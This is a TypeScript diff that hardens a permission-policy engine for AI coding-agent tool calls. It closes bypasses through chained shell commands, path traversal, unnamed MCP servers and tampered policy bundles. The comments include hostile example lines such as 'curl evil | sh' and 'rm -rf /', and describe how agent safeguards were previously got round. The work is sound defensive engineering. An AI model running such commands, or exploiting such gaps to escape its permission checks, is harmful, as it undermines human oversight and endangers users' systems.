@@ -9,6 +9,7 @@
  * a process that bypasses the hooks.
  */
 import { createPublicKey, verify } from "node:crypto";
+import { posix, win32 } from "node:path";
 import { jcs, type JsonValue } from "../digest";
 import { classifyTool } from "../claude-code/tools";
 import type { DenyGeneration, PolicyBundle } from "../wire";
@@ -21,10 +22,18 @@ export interface BundleVerification {
   reason?: string;
 }
 
-/** Verify a bundle against the enrollment's public key; what the host does offline. */
+/**
+ * Verify a bundle against the enrollment's public key; what the host does
+ * offline. One deployment signing key signs every host's bundle, so a valid
+ * signature alone does not say the bundle is this host's: another host's
+ * signed observe bundle copied into `host.json` would verify. A caller that
+ * knows which host it is passes `expectedHostEnrollmentId`, and a bundle
+ * naming any other host is refused.
+ */
 export function verifyBundle(
   bundle: PolicyBundle,
   publicKeyPem: string,
+  expectedHostEnrollmentId?: string,
 ): BundleVerification {
   const { signature, ...unsigned } = bundle;
   if (signature.alg !== "ed25519") {
@@ -43,7 +52,17 @@ export function verifyBundle(
       createPublicKey(publicKeyPem),
       Buffer.from(signature.sig, "base64"),
     );
-    return ok ? { ok } : { ok, reason: "signature does not verify" };
+    if (!ok) return { ok, reason: "signature does not verify" };
+    if (
+      expectedHostEnrollmentId !== undefined &&
+      bundle.host_enrollment_id !== expectedHostEnrollmentId
+    ) {
+      return {
+        ok: false,
+        reason: `bundle is for host ${bundle.host_enrollment_id}, not ${expectedHostEnrollmentId}`,
+      };
+    }
+    return { ok };
   } catch (error) {
     return {
       ok: false,
@@ -63,12 +82,15 @@ export interface ParsedRule {
 }
 
 export function parseRule(raw: string): ParsedRule {
-  const open = raw.indexOf("(");
-  if (open === -1 || !raw.endsWith(")")) return { raw, tool: raw.trim() };
+  // Trimmed first: a rule stored with a trailing space or newline otherwise
+  // fails the closing-paren test and never matches anything.
+  const rule = raw.trim();
+  const open = rule.indexOf("(");
+  if (open === -1 || !rule.endsWith(")")) return { raw, tool: rule };
   return {
     raw,
-    tool: raw.slice(0, open).trim(),
-    spec: raw.slice(open + 1, -1),
+    tool: rule.slice(0, open).trim(),
+    spec: rule.slice(open + 1, -1),
   };
 }
 
@@ -109,30 +131,268 @@ function commandMatches(spec: string, command: string): boolean {
   return new RegExp(`^${pattern}$`).test(command);
 }
 
-function candidatePaths(
-  path: string,
-  cwd: string | undefined,
-  home: string | undefined,
+/**
+ * The operators that end one simple command and start the next, longest
+ * first so `&&` is not read as two `&`.
+ */
+const SHELL_OPERATORS = ["&&", "||", ";;", "|&", ";", "|", "&", "\n"];
+
+/** Reserved words that can open a command without being the command. */
+const SHELL_LEADING_WORDS = new Set([
+  "!",
+  "{",
+  "}",
+  "if",
+  "then",
+  "else",
+  "elif",
+  "fi",
+  "do",
+  "done",
+  "while",
+  "until",
+  "time",
+]);
+
+function withoutLeadingWords(segment: string): string {
+  let rest = segment.trim();
+  for (;;) {
+    const match = /^(\S+)(?:\s+|$)/.exec(rest);
+    if (match === null || !SHELL_LEADING_WORDS.has(match[1] as string))
+      return rest;
+    rest = rest.slice(match[0].length);
+  }
+}
+
+/**
+ * The simple commands one shell line runs, for rule matching.
+ *
+ * A rule names one command, and a line can chain several: `Bash(git
+ * status:*)` must not grant `git status && curl evil | sh`, and `Bash(rm
+ * -rf:*)` must still refuse `true && rm -rf /`. So the line is cut at every
+ * unquoted `&&`, `||`, `;`, `|`, `&` and newline, and at every subshell or
+ * command substitution (`(`, `)`, `$(`, a backtick), since each of those
+ * runs a command of its own. A substitution still runs inside double
+ * quotes, so it is cut there too; single quotes and backslash escapes are
+ * literal. `2>&1`, `&>` and `>|` are redirections, not separators.
+ *
+ * Deliberately not a shell parser. Where it is unsure it cuts, which makes
+ * a deny or ask rule match more and an allow rule match less. Segments keep
+ * their quotes, so a rule matches the text the way it did before.
+ *
+ * With `heredocs`, a here-document body is skipped as the data it is, so an
+ * apostrophe in a commit message fed through `<<'EOF'` does not open a
+ * quote that hides the `git push` after it. That reading can be wrong (a
+ * `<<` inside arithmetic is a shift), and a wrong skip hides commands, so
+ * it only ever adds segments for a deny or ask rule to match. An allow rule
+ * reads the line without it.
+ */
+export function shellSegments(
+  command: string,
+  options: { heredocs?: boolean } = {},
 ): string[] {
-  const out = [path];
-  if (cwd !== undefined && path.startsWith(`${cwd}/`)) {
-    out.push(path.slice(cwd.length + 1));
+  const segments: string[] = [];
+  const stack: Array<"'" | '"' | "(" | "`"> = [];
+  const pendingHeredocs: Array<{ word: string; tabs: boolean }> = [];
+  let current = "";
+  const cut = (): void => {
+    const segment = withoutLeadingWords(current);
+    // A segment of nothing but quotes (the `"` left after `"$(...)"`) runs
+    // no command.
+    if (/[^\s'"]/.test(segment)) segments.push(segment);
+    current = "";
+  };
+  for (let i = 0; i < command.length; i += 1) {
+    const ch = command[i] as string;
+    const top = stack.at(-1);
+    if (top === "'") {
+      current += ch;
+      if (ch === "'") stack.pop();
+      continue;
+    }
+    if (ch === "\\") {
+      current += command.slice(i, i + 2);
+      i += 1;
+      continue;
+    }
+    if (ch === "$" && command[i + 1] === "(") {
+      cut();
+      stack.push("(");
+      i += 1;
+      continue;
+    }
+    if (ch === "`") {
+      cut();
+      if (top === "`") stack.pop();
+      else stack.push("`");
+      continue;
+    }
+    if (top === '"') {
+      current += ch;
+      if (ch === '"') stack.pop();
+      continue;
+    }
+    if (ch === "'" || ch === '"') {
+      current += ch;
+      stack.push(ch);
+      continue;
+    }
+    if (
+      options.heredocs === true &&
+      command.startsWith("<<", i) &&
+      !command.startsWith("<<<", i)
+    ) {
+      const heredoc =
+        /^<<(-?)[ \t]*(?:'([^'\n]*)'|"([^"\n]*)"|([^\s;&|<>()]+))/.exec(
+          command.slice(i),
+        );
+      if (heredoc !== null) {
+        pendingHeredocs.push({
+          word:
+            heredoc[2] ??
+            heredoc[3] ??
+            (heredoc[4] as string).replace(/["'\\]/g, ""),
+          tabs: heredoc[1] === "-",
+        });
+        current += heredoc[0];
+        i += heredoc[0].length - 1;
+        continue;
+      }
+    }
+    if (ch === "(") {
+      cut();
+      stack.push("(");
+      continue;
+    }
+    if (ch === ")") {
+      cut();
+      if (top === "(") stack.pop();
+      continue;
+    }
+    const prev = command[i - 1];
+    const next = command[i + 1];
+    const redirection =
+      (ch === "&" && (prev === ">" || prev === "<" || next === ">")) ||
+      (ch === "|" && prev === ">");
+    const operator = redirection
+      ? undefined
+      : SHELL_OPERATORS.find((op) => command.startsWith(op, i));
+    if (operator !== undefined) {
+      cut();
+      i += operator.length - 1;
+      if (operator === "\n" && pendingHeredocs.length > 0) {
+        i = heredocBodiesEnd(command, i + 1, pendingHeredocs) - 1;
+        pendingHeredocs.length = 0;
+      }
+      continue;
+    }
+    current += ch;
   }
-  if (home !== undefined && path.startsWith(`${home}/`)) {
-    out.push(`~/${path.slice(home.length + 1)}`);
+  cut();
+  return segments;
+}
+
+/** Where the here-document bodies starting at `start` end, past each delimiter line. */
+function heredocBodiesEnd(
+  command: string,
+  start: number,
+  heredocs: ReadonlyArray<{ word: string; tabs: boolean }>,
+): number {
+  let at = start;
+  for (const { word, tabs } of heredocs) {
+    while (at < command.length) {
+      const newline = command.indexOf("\n", at);
+      const end = newline === -1 ? command.length : newline;
+      const line = command.slice(at, end);
+      at = newline === -1 ? command.length : newline + 1;
+      if ((tabs ? line.replace(/^\t+/, "") : line) === word) break;
+    }
   }
+  return at;
+}
+
+/**
+ * Whether a `Bash(...)` spec matches a shell line. A restriction (deny or
+ * ask) matches when the whole line or any one command in it does; a grant
+ * matches only when every command in it does.
+ */
+function shellCommandMatches(
+  spec: string,
+  command: string,
+  effect: RuleEffect,
+): boolean {
+  const segments = shellSegments(command);
+  if (effect === "allow") {
+    return segments.length === 0
+      ? commandMatches(spec, command)
+      : segments.every((segment) => commandMatches(spec, segment));
+  }
+  return (
+    commandMatches(spec, command) ||
+    segments.some((segment) => commandMatches(spec, segment)) ||
+    shellSegments(command, { heredocs: true }).some((segment) =>
+      commandMatches(spec, segment),
+    )
+  );
+}
+
+const WINDOWS_PATH = /^(?:[A-Za-z]:[\\/]|\\\\)/;
+
+/** A Windows path, by the platform when the caller knows it, else by shape. */
+function isWindowsPath(path: string, context: MatchContext): boolean {
+  return (
+    context.platform === "win32" ||
+    WINDOWS_PATH.test(path) ||
+    (context.cwd !== undefined && WINDOWS_PATH.test(context.cwd))
+  );
+}
+
+/**
+ * The forms of one path a rule is tested against: resolved (so
+ * `/repo/../etc/passwd` is `/etc/passwd`, and a relative path is read
+ * against the cwd), relative to the cwd, and `~/`-relative to home. The raw
+ * path is not a candidate, because `src/../../etc/passwd` would otherwise
+ * match an allow rule written for `src/**`. A Windows path has its
+ * backslashes folded to `/`, which is how rules are written.
+ */
+function candidatePaths(path: string, context: MatchContext): string[] {
+  const windows = isWindowsPath(path, context);
+  const lib = windows ? win32 : posix;
+  const fold = (value: string): string =>
+    windows ? value.replace(/\\/g, "/") : value;
+  const { cwd, home } = context;
+  const expanded =
+    home !== undefined && /^~(?:[/\\]|$)/.test(path)
+      ? `${home}${path.slice(1)}`
+      : path;
+  const resolved = fold(
+    cwd !== undefined && lib.isAbsolute(cwd)
+      ? lib.resolve(cwd, expanded)
+      : lib.normalize(expanded),
+  );
+  const out = [resolved];
+  const under = (root: string): string | undefined => {
+    const base = fold(lib.normalize(root)).replace(/\/+$/, "");
+    return resolved.startsWith(`${base}/`)
+      ? resolved.slice(base.length + 1)
+      : undefined;
+  };
+  const relative = cwd !== undefined ? under(cwd) : undefined;
+  if (relative !== undefined) out.push(relative);
+  const fromHome = home !== undefined ? under(home) : undefined;
+  if (fromHome !== undefined) out.push(`~/${fromHome}`);
   return out;
 }
 
 function pathMatches(
   spec: string,
   path: string,
-  cwd: string | undefined,
-  home: string | undefined,
+  context: MatchContext,
 ): boolean {
-  const pattern = spec.startsWith("//") ? spec.slice(1) : spec;
+  const folded = isWindowsPath(path, context) ? spec.replace(/\\/g, "/") : spec;
+  const pattern = folded.startsWith("//") ? folded.slice(1) : folded;
   const regex = globToRegex(pattern);
-  return candidatePaths(path, cwd, home).some((candidate) =>
+  return candidatePaths(path, context).some((candidate) =>
     regex.test(candidate),
   );
 }
@@ -157,9 +417,33 @@ function isShellTool(toolName: string): boolean {
   return toolName === "Bash" || toolName === "Shell";
 }
 
-function toolNameMatches(ruleTool: string, toolName: string): boolean {
+/**
+ * Cursor names an MCP call `MCP:<tool>` and, when its payload does not name
+ * the server, the adapter leaves it that way rather than invent one. No
+ * `mcp__<server>__<tool>` rule could match that name, so every MCP rule
+ * missed it and the call was allowed. A restriction therefore matches on
+ * the tool segment alone, as if the server were whichever one the rule
+ * names (`mcp__<server>` with no tool segment names all its tools). A grant
+ * never does: an unnamed server is not the one the grant was written for.
+ */
+function unnamedServerMcpMatches(ruleTool: string, toolName: string): boolean {
+  const unnamed = /^MCP:(.+)$/.exec(toolName);
+  if (unnamed === null || !ruleTool.startsWith("mcp__")) return false;
+  const rest = ruleTool.slice("mcp__".length);
+  const separator = rest.indexOf("__");
+  const toolGlob = separator === -1 ? "*" : rest.slice(separator + 2);
+  return globToRegex(toolGlob).test(unnamed[1] as string);
+}
+
+function toolNameMatches(
+  ruleTool: string,
+  toolName: string,
+  effect: RuleEffect,
+): boolean {
   if (ruleTool === toolName) return true;
   if (TOOL_SYNONYMS[ruleTool] === toolName) return true;
+  if (effect !== "allow" && unnamedServerMcpMatches(ruleTool, toolName))
+    return true;
   if (ruleTool.includes("*")) return globToRegex(ruleTool).test(toolName);
   // `mcp__server` matches every tool of that server.
   return (
@@ -172,23 +456,37 @@ function toolNameMatches(ruleTool: string, toolName: string): boolean {
 export interface MatchContext {
   cwd?: string;
   home?: string;
+  /** Folds backslashes in paths when `win32`; a drive-letter path is folded anyway. */
+  platform?: NodeJS.Platform;
 }
 
-/** Does a rule match this tool call? */
+/**
+ * Which bucket a rule sits in. A grant has to cover the whole call; a
+ * restriction only has to touch part of it.
+ */
+export type RuleEffect = "allow" | "deny" | "ask";
+
+/**
+ * Does a rule match this tool call? `effect` is the bucket the rule came
+ * from, and defaults to the narrower grant reading.
+ */
 export function ruleMatches(
   rule: ParsedRule,
   toolName: string,
   toolInput: Record<string, unknown> | undefined,
   context: MatchContext = {},
+  effect: RuleEffect = "allow",
 ): boolean {
-  if (!toolNameMatches(rule.tool, toolName)) return false;
+  if (!toolNameMatches(rule.tool, toolName, effect)) return false;
   if (rule.spec === undefined) return true;
   const input = toolInput ?? {};
   const text = (key: string): string | undefined =>
     typeof input[key] === "string" ? (input[key] as string) : undefined;
   if (isShellTool(toolName)) {
     const command = text("command");
-    return command !== undefined && commandMatches(rule.spec, command);
+    return (
+      command !== undefined && shellCommandMatches(rule.spec, command, effect)
+    );
   }
   if (toolName === "WebFetch" || toolName === "WebSearch") {
     const url = text("url") ?? text("query");
@@ -208,7 +506,7 @@ export function ruleMatches(
     text("path") ??
     text("pattern");
   if (path !== undefined) {
-    return pathMatches(rule.spec, path, context.cwd, context.home);
+    return pathMatches(rule.spec, path, context);
   }
   // A tool with no path-like member: the spec is a glob over the whole input.
   return commandMatches(rule.spec, JSON.stringify(input));
@@ -249,6 +547,13 @@ export interface EvaluationInput {
    * this session (ADR-152). Set by the caller, which knows the session.
    */
   containmentUnmet?: boolean;
+  /**
+   * The harness's own read-only claim for this tool (Stella's
+   * `tool.read_only`). Honoured only when true, only where no verified
+   * declaration exists and the classifier sees no write, and only to let a
+   * read through: it never turns a known write into a read.
+   */
+  harnessReadOnly?: boolean;
   now: number;
   context?: MatchContext;
 }
@@ -315,12 +620,58 @@ function firstMatch(
   toolName: string,
   toolInput: Record<string, unknown> | undefined,
   context: MatchContext | undefined,
+  effect: RuleEffect,
 ): string | undefined {
   for (const raw of rules) {
-    if (ruleMatches(parseRule(raw), toolName, toolInput, context)) return raw;
+    if (ruleMatches(parseRule(raw), toolName, toolInput, context, effect))
+      return raw;
   }
   return undefined;
 }
+
+/**
+ * The allow rule, or rules, that grant this call. A shell line is granted
+ * only when every command in it is, but each command may be granted by a
+ * different rule, as Claude Code does: `Bash(git add:*)` and `Bash(git
+ * commit:*)` together grant `git add . && git commit -m x`.
+ */
+function allowMatch(
+  rules: readonly string[],
+  toolName: string,
+  toolInput: Record<string, unknown> | undefined,
+  context: MatchContext | undefined,
+): string | undefined {
+  const single = firstMatch(rules, toolName, toolInput, context, "allow");
+  if (single !== undefined || !isShellTool(toolName)) return single;
+  const command = toolInput?.["command"];
+  if (typeof command !== "string") return undefined;
+  const segments = shellSegments(command);
+  if (segments.length < 2) return undefined;
+  const used: string[] = [];
+  for (const segment of segments) {
+    const rule = firstMatch(
+      rules,
+      toolName,
+      { ...toolInput, command: segment },
+      context,
+      "allow",
+    );
+    if (rule === undefined) return undefined;
+    if (!used.includes(rule)) used.push(rule);
+  }
+  return used.join(" and ");
+}
+
+/** Effects the classifier names as writes; a harness read-only claim cannot undo them. */
+const WRITE_EFFECTS = new Set([
+  "file_write",
+  "file_edit",
+  "file_delete",
+  "command",
+  "git_commit",
+  "git_push",
+  "pr_open",
+]);
 
 /**
  * The ordered `PreToolUse` evaluation. Operator state (suspended, paused,
@@ -329,13 +680,21 @@ function firstMatch(
  */
 export function evaluatePreToolUse(input: EvaluationInput): Evaluation {
   const { bundle, toolName, toolInput } = input;
-  const declared =
-    bundle.tools[toolName] ??
-    (TOOL_SYNONYMS[toolName] !== undefined
-      ? bundle.tools[TOOL_SYNONYMS[toolName] as string]
-      : undefined);
+  // An unverified bundle's tool declarations are as untrusted as the rest
+  // of it: one that marked `Bash` read-only would let every command through
+  // the read-only allowance below.
+  const declared = !input.bundleVerified
+    ? undefined
+    : (bundle.tools[toolName] ??
+      (TOOL_SYNONYMS[toolName] !== undefined
+        ? bundle.tools[TOOL_SYNONYMS[toolName] as string]
+        : undefined));
   const classified = classifyTool(toolName, toolInput);
-  const readOnly = declared?.read_only ?? !classified.tool_is_mutating;
+  const harnessSaysRead =
+    input.harnessReadOnly === true &&
+    !WRITE_EFFECTS.has(classified.effect_kind);
+  const readOnly =
+    declared?.read_only ?? (!classified.tool_is_mutating || harnessSaysRead);
   const riskGrade =
     declared?.risk_grade ??
     (classified.tool_is_mutating ? ("medium" as const) : ("low" as const));
@@ -391,20 +750,27 @@ export function evaluatePreToolUse(input: EvaluationInput): Evaluation {
     );
   }
 
+  // Nothing an unverified bundle says is trusted, its mode included: an
+  // edit to host.json that turns `enforce` into `observe` is exactly what
+  // breaks the signature. So a tool that is not read-only is refused
+  // whatever mode the bundle claims. An observe bundle still lets reads
+  // through, as it did; an enforce bundle still refuses everything.
   if (!input.bundleVerified) {
-    if (bundle.mode === "observe") {
+    if (bundle.mode === "observe" && readOnly) {
       return {
         decision: "allow",
         evaluated: "defer",
         source: "bundle",
         reason_code: "bundle_unverified",
-        reason: "The cached bundle did not verify; observe mode allows.",
+        reason: "The cached bundle did not verify; observe mode allows reads.",
         ...base,
       };
     }
     return deny(
       "bundle_unverified",
-      "The cached policy bundle did not verify and enforce mode fails closed.",
+      bundle.mode === "observe"
+        ? "The cached policy bundle did not verify, so its observe mode is not trusted and only read-only tools are allowed."
+        : "The cached policy bundle did not verify and enforce mode fails closed.",
     );
   }
 
@@ -451,6 +817,7 @@ export function evaluatePreToolUse(input: EvaluationInput): Evaluation {
     toolName,
     toolInput,
     input.context,
+    "deny",
   );
   if (denied !== undefined) {
     return {
@@ -465,8 +832,33 @@ export function evaluatePreToolUse(input: EvaluationInput): Evaluation {
     };
   }
 
-  // 4. Allow rules.
-  const allowed = firstMatch(
+  // 4. Ask rules, before allow rules, which is Claude Code's own order. A
+  // mandate compiles a `github:*` allow and a `github:merge_pull_request`
+  // ask into `mcp__github__*` and `mcp__github__merge_pull_request` in
+  // different buckets, and allow first let the broad grant answer for the
+  // call the approval was written for.
+  const ask = firstMatch(
+    bundle.permissions.ask,
+    toolName,
+    toolInput,
+    input.context,
+    "ask",
+  );
+  if (ask !== undefined) {
+    return {
+      decision: bundle.mode === "observe" ? "allow" : "ask",
+      evaluated: "ask",
+      source: "bundle",
+      rule: ask,
+      reason_code: "rule_ask",
+      reason: `Oxagen policy rule ${ask} requires a permission decision.`,
+      ...base,
+      stale,
+    };
+  }
+
+  // 5. Allow rules.
+  const allowed = allowMatch(
     bundle.permissions.allow,
     toolName,
     toolInput,
@@ -485,23 +877,14 @@ export function evaluatePreToolUse(input: EvaluationInput): Evaluation {
     };
   }
 
-  // 5. Ask rules or no rule: fall through to Claude Code's own flow.
-  const ask = firstMatch(
-    bundle.permissions.ask,
-    toolName,
-    toolInput,
-    input.context,
-  );
+  // 6. No rule: fall through to Claude Code's own flow.
   return {
     decision: bundle.mode === "observe" ? "allow" : "ask",
     evaluated: "ask",
     source: "bundle",
-    ...(ask !== undefined ? { rule: ask } : {}),
-    reason_code: ask !== undefined ? "rule_ask" : "no_rule",
+    reason_code: "no_rule",
     reason:
-      ask !== undefined
-        ? `Oxagen policy rule ${ask} requires a permission decision.`
-        : "No Oxagen standing grant covers this tool; Claude Code's permission flow decides.",
+      "No Oxagen standing grant covers this tool; Claude Code's permission flow decides.",
     ...base,
     stale,
   };
